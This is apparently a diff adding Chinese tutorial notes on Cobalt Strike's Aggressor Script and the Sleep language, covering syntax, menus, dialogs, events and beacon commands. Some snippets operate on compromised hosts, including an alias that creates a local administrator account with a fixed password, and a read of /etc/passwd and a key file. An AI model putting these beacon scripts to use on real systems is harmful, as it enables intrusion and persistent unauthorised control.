@@ -691,8 +691,624 @@ Cobalt Strike 通过团队服务器发送钓鱼邮件。
 
 ### Tor Fronting
 
-## cs插件
+## cs脚本
 
+> 一些脚本
+>
 > https://github.com/Mikasazero/Cobalt-Strike
 >
 > https://github.com/harleyQu1nn/AggressorScripts
+>
+> https://github.com/yanghaoi/CobaltStrike_CNA
+>
+> 官方开发文档：
+>
+> http://sleep.dashnine.org/manual/  sleep语言的：
+>
+> https://trial.cobaltstrike.com/aggressor-script/other.html cs接口的
+>
+> 看完官方文档，再看几个别人写的脚本，就会了。
+>
+> 脚本开发
+>
+> https://xz.aliyun.com/t/11404
+>
+> https://xz.aliyun.com/t/5887
+> https://422926799.github.io/posts/e5e87074.html
+>
+> https://wiki.wgpsec.org/knowledge/intranet/Aggressor-script.html
+
+### cs的脚本语言-agscript
+
+agscript是一种简单脚本语言，主要用于红队编写针对肉鸡的攻击脚本。 它有两个作用，一是可以用来对自己的肉鸡做持久性控制，二是可以用来扩展或修改Cobalt Strike客户端以满足您的个性化需求。
+
+agscript是以Cobalt Strike 3.0为基础的。 Cobalt Strike 3.0中绝大部分菜单/按钮事件都是由agscript引擎支撑。 Strategic Cyber LLC尚未为Cobalt Strike的大多数功能写API，也就是说，agscript目前仍处于起步阶段。 在未来，我们也期待看到agscript的发展壮大。这份文档也会**随着时间的推移而变动**。
+
+加载脚本：
+
+- Cobalt Strike客户端 -> Script Manager and press Load功能。
+
+脚本控制台：
+
+- Cobalt Strike提供了交互式的脚本控制台。 通过控制台可跟踪，配置，调试以及管理脚本。可以通过View- > Script Console获得进入agscript控制台。
+
+- 基本命令：输入help
+
+    - | 命令    | 参数                              | 作用                                                         |
+        | ------- | --------------------------------- | ------------------------------------------------------------ |
+        | ?       | `? int(1) == int(2)`返回为False： | ? 进行一个简单的判断，返回值为True或者False                  |
+        | e       | 例如 `e println("hello woed")`:   | e 执行我们写的代码，相当于交互模式,如果不加上 `e` 的话是无法执行的 |
+        | help    |                                   | 列出所有命令                                                 |
+        | load    | ./xxx/xx/a.cna                    | 加载脚本                                                     |
+        | ls      |                                   | 查看已加载的脚本                                             |
+        | proff   | script.cna                        |                                                              |
+        | profile | script.cna                        | 统计 cna 脚本使用了哪些 Sleep的语法：                        |
+        | pron    | script.cna                        |                                                              |
+        | reload  | script.cna                        | 重新加载脚本                                                 |
+        | troff   | script.cna                        | 关闭函数跟踪，也就是我们不显示函数运行的具体情况：           |
+        | tron    | script.cna                        | 开启函数跟踪，显示我们运行时的具体情况：                     |
+        | unload  | script.cna                        | 卸载脚本                                                     |
+        | x       | 2+2                               | 执行脚本并返回结果                                           |
+
+**命令行使用Cobalt Strike：**
+
+- (注意：cmd得进入到agscript的路径里，否则会出现无法加载主体的情况)您也许会希望在在没有GUI的情况下启动Cobalt Strike，客户端压缩包中的agscript这个脚本文件能够满足您的需求，连接命令：
+
+- ```cmd
+    ./agscript [host] [port] [user] [password]
+    远程连接cs并执行脚本
+    ./agscript [host] [port] [user] [password] [/path/to/script.cna]
+    ```
+
+### Sleep语言基础
+
+- agscript是基于Raphael Mudge的Sleep语言的二次开发的。(译者注:Sleep是一种基于java开发的脚本语言)
+    原手册见：http://sleep.dashnine.org/manual
+
+- 不知道为什么cs下的agscript .bat接受不到命令行参数，所以使用了sleep.jar（http://sleep.dashnine.org/download/sleep.jar）来运行cna文件。
+
+    - ```
+        java -jar .\sleep.jar
+        	>> Welcome to the Sleep scripting language
+        	> load test.cna
+        ```
+
+    - 解决方法：
+
+        - agscript .bat文件改成`java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar aggressor.headless.Start %*`
+
+        - 原本的agscript .bat最后是`$*`接受命令行参数（也许是macos下的），但是windows cmd下是用`%*`来接受命令行参数的。
+
+- `Sleep`能做的`agscript`都能做，下面是一些注意事项：
+
+- `Sleep`的语法，运算符甚至俚语都与`Perl`极其类似,简单说一个他们的区别,**`Sleep`需要的语句/表达式之间需要有空格**。
+
+    - ```
+        $x=1+2; # this will not parse!!
+        $x = 1 + 2; # 正确的做法
+        ```
+
+#### 数据类型和数据结构：
+
+- 数字 $      
+
+- 字符串 $
+
+- Arrays @    类似python的list，元素类型可以不一样
+
+- Lists 
+
+- Stacks
+
+- Sets
+
+- Hashs %    类似python的字典
+
+- ```php
+    #字符串
+    $name = "kris";         		 #字符串变量的命名
+    $name = "kris"."hello";  		 #. 字符串拼接，不需要空格
+    #\$来转义$（在字符串中，$a就是$a的值），同时也支持\n等功能，
+    on ready {
+        $a = "data"."data";
+        $a = replace($a, "data", "Fk");  #字符串替换 
+        println($a);
+        closeClient();
+    }
+    strlen($data);#获取字符串长度 
+    substr($data, 0, 3)#获取字符串指定位置 
+    println(join('|', @("ape", "bat", "cat", "dog"))); #数组转字符串 ,join(分隔符,)
+    #字符串转数组， 
+    $a = "data".".data";
+    @b = split('\.', $a);  #按照.来切分字符串
+    #判断字符串是否在数组里面
+    $data = @("abc", "bqe");
+    $str = "abc";
+    if ($str in $data)  {
+        println(111);
+    }
+    
+    
+    
+    
+    
+    #整数
+    $age = 18; # 数字型变量命名
+    
+    #Arrays类型：  
+    #可以用$a当作变量，也可以使用他们本身的前缀，比如@a,%a。但是前后变量不能改变，不能前面$a创建了变量，后面就用@a使用变量了
+    $a = @("kris",18); # Sleep的阵列（列表）是类似python的那种任何元素的集合，不需要元素的类型统一。也即是一种复合数据类型。
+    println($a[0]); 		#下标输出信息
+    push($a,"jack")   		#末尾添加元素，类似python append，
+    add($a, "wYYYYYYYYYYYYYYYYYYYYYYYY", -1); #数组添加，默认在0位添加，也就是开头，-1就是末尾, 需要自己指定位置。
+    remove($a,-1,"wYYYYYYYYYYYYYYYYYYYYYYYY")    # 需要指定删除的内容，下标，且两个要对应起来，不对应也可以删除掉，应该是更具内容判定的。
+    
+    
+     
+    #Hashs字典类型
+    %d["name"] = "kris";
+    %d["age"] = 18;
+    %d["address"] = "sichuan"; 				#使用%号创建，有点和python的字典类似   
+    println("Dict is ".%d);  				#输出字典
+    removeAt(%d, "name");					 #删除字典的某个key
+    removeAt(%a, "data", "data2");   		#或者删除多个key
+    
+    ```
+
+#### 遍历
+
+- ```php
+    #遍历数组
+    @name_list = @('kris',18,'sichuan');
+    foreach $var (@name_list)   #()不能少
+    {
+       println($var);
+    }
+    
+    #遍历hash字典。
+    foreach $data (keys(%foo)){ 
+        println("$data =>".%foo[$data]); 
+    }
+    #遍历字典第二个方法
+    foreach $key = > $value (%foo) {
+        println("$key => $value");
+    }
+    ```
+
+#### 循环
+
+```
+```
+
+
+
+#### 打印：
+
+- 有一个和println类似的函数叫warn，不同的是warn输出的内容中包含了当前代码的文件名和行数，一般用于调试错误
+
+#### 函数：
+
+- ```php
+    #函数定义，参数传递使用$i。传给函数的参数标记为$1,$2,一直到$n。函数可以接受无数个参数。
+    #变量@_是一个包含所有参数的数组，$1，$2等变量的更改将改变@_的内容。
+    sub say_hello{
+    	println("hello ".$1);# 定义一个函数，打印hello + 得到的参数
+    }
+    sub addTwoValues {
+        println($1 + $2);
+    }
+    
+    #函数的引用
+    $addf = &addTwoValues;
+    
+    #调用并传参可以这样写：
+    [$addf : "3", 55.0];
+    [&addTwoValues : "3", 55.0];
+    [{ println($1 + $2); } : "3", 55.0];
+    addTwoValues("3", 55.0);
+    
+    ```
+
+#### 循环：
+
+```
+#iff,将比较作为第一个参数，并仅当条件为真时，将其返回第二个参数。仅当条件为false时，就会返回第三个参数,三目运算符
+#闭包：lambda(&closure, [$key => "value", ...])   （传入函数体，）
+
+sub range {
+    # Returns a new function that returns the next number in the    # range with each call.  Returns $null at the end of the range    # Don't worry, closures will come in the next chapter :)    
+    return lambda( {
+        return iff($begin <= $end, $begin++  -  1, $null);
+    }, $begin = > $1, $end = > $2);
+}
+
+on ready {
+    foreach $value (range(1, 10)) {
+        println($value);
+    }
+
+    closeClient();
+}
+```
+
+
+
+#### 逻辑运算
+
+- | ==   |                 |
+    | ---- | --------------- |
+    | !=   |                 |
+    | <    |                 |
+    | >    |                 |
+    | <=   |                 |
+    | >=   |                 |
+    | !    | !a 中间没有空格 |
+
+- 字符串比较：
+
+    - | Operator                                           | Description                                |
+        | :------------------------------------------------- | :----------------------------------------- |
+        | eq                                                 | equal to                                   |
+        | ne                                                 | not equal to                               |
+        | lt                                                 | less than                                  |
+        | gt                                                 | greater than                               |
+        | isin                                               | is substring v1 contained in string v2     |
+        | [iswm](http://sleep.dashnine.org/manual/iswm.html) | is string v1 a wildcard match of string v2 |
+
+- 判断是不是数组/函数/hash/数字..
+
+    - | -isarray    | is v1 a scalar array         |
+        | ----------- | ---------------------------- |
+        | -isfunction | does v1 reference a function |
+        | -ishash     | is v1 a scalar hash          |
+        | -isletter   | is v1 a letter               |
+        | -isnumber   | is v1 a number               |
+        | -isupper    | is v1 an upper case string   |
+        | -islower    | is v1 a lower case string    |
+        | -istrue     | is v1 "true"                 |
+
+#### 文件读写
+
+```
+逐行读取文件 
+$handle = openf("/etc/passwd");
+while $text (readln($handle)) {
+    println("Read: $text");
+}
+
+一次性读完
+$handle = openf("/path/to/key.pem");
+$keydata = readb($handle, - 1);
+closef($handle);
+
+写入文件 
+$handle = openf(">data.txt");
+println($handle, "this is some data.");
+closef($handle);
+
+写入文件方法2 
+$handle = openf(">out.txt");
+writeb($handle, $data);
+closef($handle);
+```
+
+#### 更多操作参考文档
+
+### CS开发 
+
+> 官方文档
+>
+> https://trial.cobaltstrike.com/aggressor-script
+>
+> 一定要看https://trial.cobaltstrike.com/aggressor-script/functions.html 所有的方法都在里面
+
+#### 文件路径:
+
+任何使用到本地文件的都需要，`script_resource(path)`
+
+```
+bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+```
+
+#### 命令快捷键
+
+```
+#命令是给cs用的，命令名字叫N。
+command N {
+	say_hello($1); # 定义一个命令，并且将接受到的第一个参数传递给 say_hello函数。
+}
+
+在cs下
+aggressor> N jack
+hello jack
+```
+
+
+
+#### 控制台颜色设置
+
+如果你想给Cobalt Strike的控制台添加一些色彩，通过\c，\U和\o转义即可告诉Cobalt Strike如何格式化文本。 值得提醒的是这些转义仅在双引号字符串内有效。\cX就是告诉Cobalt Strike你想输出什么颜色，X是颜色的值
+
+![image-20220926193504331](./cs.assets/image-20220926193504331.png)
+
+```
+\U是告诉控制台添加下划线，\o则是重置这些花里胡哨的东西。
+```
+
+![image-20220926193542227](./cs.assets/image-20220926193542227.png)
+
+#### 快捷键绑定
+
+```
+bind Ctrl + H {
+    show_message("DIO");
+}
+```
+
+快捷键可以是任何ASCII字符或特殊键，快捷方式可能会应用一个或多个修饰符，修饰符修饰符仅为以下几个特定按键：Ctrl，Shift，Alt，Meta。脚本可以指定修饰符+键。
+按Ctrl+H效果如下
+
+#### 弹出菜单
+
+- 使用agscript可以添加或是重新定义CoblatStrike菜单，**popup这个关键字即为Hook弹出菜单的语句。**
+
+- 可以popup的地方
+
+    - | Hook                 | Where                         | Arguments                                                    |
+        | :------------------- | :---------------------------- | :----------------------------------------------------------- |
+        | aggressor            | **Cobalt Strike** Menu        |                                                              |
+        | attacks              | **Attacks** Menu              |                                                              |
+        | beacon               | [session]                     | $1 = selected beacon IDs (array)                             |
+        | beacon_top           | [session]                     | $1 = selected beacon IDs (array)                             |
+        | beacon_bottom        | [session]                     | $1 = selected beacon IDs (array)      beacon主机的右键菜单，传入的第一个参数是beacon的bid，     常定义`$bid = $1;` |
+        | credentials          | Credential Browser            | $1 = selected credential rows (array of hashes)              |
+        | filebrowser          | [file in file browser]        | $1 = beacon ID, $2 = folder, $3 = selected files (array)     |
+        | help                 | **Help** Menu                 |                                                              |
+        | listeners            | Listeners table               | $1 = selected listener names (array)                         |
+        | pgraph               | [pivot graph]                 |                                                              |
+        | processbrowser       | Process Browser               | $1 = Beacon ID, $2 = selected processes (array)              |
+        | processbrowser_multi | Multi-Session Process Browser | $1 = selected processes (array)                              |
+        | reporting            | **Reporting** Menu            |                                                              |
+        | ssh                  | [SSH session]                 | $1 = selected session IDs (array)                            |
+        | targets              | [host]                        | $1 = selected hosts (array)                                  |
+        | targets_other        | [host]                        | $1 = selected hosts (array)                                  |
+        | view                 | **View** Menu                 |                                                              |
+
+- 一般我们都会在上线的主机上添加菜单：
+
+    - ```
+        popup beacon_bottom {
+        	
+        	item("菜单名字",{需要执行的代码}) #创建一个菜单
+        	separator(); #分割线
+        	item "菜单名字" {需要执行的代码}  #创建一个菜单
+        }
+        
+        ```
+    
+- 看一个在help上添加菜单的demo代码：
+
+```
+popup help {
+    item("&blog", {
+        url_open("https://422926799.github.io");
+    }
+
+    );
+    item("&System Information", {
+        openSystemInformationDialog();
+    }
+
+    );
+}
+```
+
+![image-20220926193730827](./cs.assets/image-20220926193730827.png)
+
+#### 添加子菜单
+
+- ```
+    popup help {
+        item("&blog", {
+            url_open("https://422926799.github.io");
+        }
+    
+        );
+        menu "&Testing" {
+            #Testing菜单下会有blog 
+            item("&blog", {
+                url_open("https://422926799.github.io");
+            }
+    
+            );
+        }
+        menu "一级菜单名字"{
+    		放二级菜单，可以嵌套，
+        }
+    
+    }
+    ```
+
+- ![image-20220926193825928](./cs.assets/image-20220926193825928.png)
+
+#### 事件管理
+
+- 使用on这个关键字可以为事件定义处理程序，
+
+    - ```
+        当Cobalt Strike连接到团队服务器并准备代表您行动时，就绪事件将触发
+        on ready {
+            show_message("舰长，我的狐狸耳朵，喜欢吗？");
+        }
+        ```
+
+    - 使用* meta-event可查看再Cobalt Strike中发生的所有事件。
+
+        - ```
+            on  * { #加载脚本的时候就运行
+                local('$handle $event $args');
+                $event = shift(@_);
+                $args = join(" ", @_);
+                $handle = openf(">>eventspy.txt");
+                writeb($handle, "[ $+ $event $+ ] $args");
+                closef($handle);
+            
+            ```
+
+#### CS数据模型
+
+
+
+#### beacon操控
+
+**beacon的右键菜单**: popup beacon_bottom
+
+```
+popup beacon_bottom{
+    item "query user"{
+        prompt_text("Query User", "administrator", lambda({
+            bshell(@ids, "net user ".$1);
+        }, @ids => $1));
+    }
+}
+```
+
+##### 打印信息到beacon的终端：blog
+
+- ```
+    $1 - the id for the beacon to post to，这个beacon的id
+    $2 - the text to post，需要输出的信息。
+    alias demo {
+    	blog($1, "I am output for the blog function");
+    }
+    ```
+
+##### 创建命令给beacon终端使用：alais
+
+- **alias**：类似于在agscript控制台定义命令的command一样，不过alias是给beacon控制操控的
+
+- ```
+    alias test{
+        bshell!($1, "whoami");
+    }
+    ```
+
+
+##### 在beacon中运行cmd命令：bshell
+
+- Ask Beacon to run a command with cmd.exe
+
+- ```
+    $1 bid数组或单个bid
+    $2  命令字符串
+    
+    alias adduser {
+    	bshell($1, "net user $2 B00gyW00gy1234! /ADD");
+    	bshell($1, "net localgroup \"Administrators\" $2 /ADD");
+    }
+    ```
+
+#####  切换becaon的shell的当前目录：bcd
+
+- ```
+    $1 bid数组或单个bid
+    $2  命目录字符串
+    
+    # create a command to change to the user's home directory
+    alias home {
+    	$home = "c:\\users\\" . binfo($1, "user");
+    	bcd($1, $home);
+    }
+    ```
+
+##### 导入ps1文件到beacon中：bpowershell_import
+
+##### 执行poweshell命令：bpowershell
+
+##### 传递exe文件并执行：bexecute_assembly
+
+### 输入，输出框
+
+#### 输入框-dialog
+
+```shell
+定义一个输入框 
+$dialog = dialog("这是对话框的标题", %(username => "root",password => ""),  &show); 
+#在一些时候，我们想整一个输入框。让用户输入一些东西的时候，可以使用 dialog 数据模型进行编写，他需要接受三个参数
+`$1` 对话框的名称
+`$2` 对话框里面的内容，可以写多个
+`$3` 回调函数，当用户使用 dbutton_action 会调用的函数，$1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.
+```
+
+drow_text是往输入框里面写东西，语法如下：
+
+```shell
+drow_text($dialog,"默认输入","文本框前面的话");
+$1 - a $dialog 对象
+$2 - the name of this row
+$3 - the label for this row
+$4 - Optional. The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider).
+```
+
+ dialog_description是描述你的输入框是干啥的
+
+```
+dialog_description($dialog, "一段描述");
+```
+
+dbutton_action 将操作按钮添加到dialog 中，当点击这个按钮以后，会关闭对话框，并且传输数据到回调函数中
+
+```shell
+dbutton_action($dialog,"按钮的名字")
+```
+
+dbutton_help 将help按钮添加到对话框中，点击help跳转网页去
+
+```shell
+dbutton_help($dialog,"https://www.wgpsec.org")
+```
+
+dialog_show 显示对话框
+
+```
+dialog_show($dialog);
+```
+
+```
+popup test {
+	item("&收集信息",{dialog_test()}); # 建立一个菜单栏目，点击收集信息时就调用show函数
+}
+
+menubar("测试菜单","test"); # 注册菜单
+
+sub show {
+	show_message("dialog的引用是：".$1."\n按钮名称是：".$2);
+	println("用户名是：".$3["user"]."\n密码是：".$3["password"]);# 这里show函数接收到了dialog传递过来的参数，分
+
+}
+sub dialog_test {
+	$info = dialog("这是对话框的标题",%(username => "root",password => ""),&show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他
+	drow_text($info,"user","输入用户名："); # 设置一个用户名输入条
+	drow_text($info,"password","输入密码"); 
+	dbutton_action($info,"马上起飞！"); # 点击按钮，触发回调函数
+	dbutton_help($info,"http://www.wgpsec"); # 显示帮助信息
+	dialog_show($info); # 显示文本输入框
+}
+```
+
+##### prompt_text: 单个文本输入框
+
+- 弹出一个输入框，用户需要输入文本，然后文本字符串就会被当作$1，传入到回调函数中。
+
+- ```
+    Arguments
+    $1 - text in the dialog
+    $2 - default value in the text field. 默认值
+    $3 - a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided.
+    
+    prompt_text("What is your name?", "Cyber Bob", {
+    	show_mesage("Hi $1 $+ , nice to meet you!");
+    });
+    ```
+
+- 
